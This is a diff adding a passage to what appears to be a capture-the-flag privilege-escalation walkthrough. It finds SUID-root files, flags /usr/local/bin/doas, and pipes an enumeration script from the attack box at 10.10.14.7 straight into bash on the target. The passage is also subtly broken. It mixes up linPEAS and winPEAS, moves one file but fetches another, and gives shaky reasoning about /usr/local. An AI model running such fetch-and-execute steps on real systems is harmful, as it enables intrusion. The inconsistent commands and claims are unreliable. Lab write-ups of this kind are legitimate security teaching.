@@ -310,4 +310,31 @@ We run
 ```
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 ```
-to see if we have any SETUID permissions. 
+to see if we have any SETUID permissions that allow us to run a file as the owner of the file.
+
+We find an interesting file
+
+```
+-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
+```
+where we can execute the file as the owner, who is root. 
+
+We can also use LINPEAS (https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) to find any exploitations that may be on the host. 
+
+We setup a directory on our attack box and create a python web server to host the winpeas.sh file. We note that our attack box ip is 10.10.14.7 
+
+```
+sudo mkdir www
+sudo mv ~/Downloads/winpeas.sh .
+sudo python3 -m http.server
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+And then we can use the curl command to access winpeas.sh
+```
+curl 10.10.14.7:8000/linpeas.sh | bash
+```
+From LINPEAS we also see /usr/local/bin/doas as a possible privesc. The reason why we focus specifically on /usr/local/bin/doas compared to other files that we can run as root is because files in the /local directory are user or admin managed rather than system managed, meaning that they are likely manually downloaded and may have additional rights. 
+
+
+
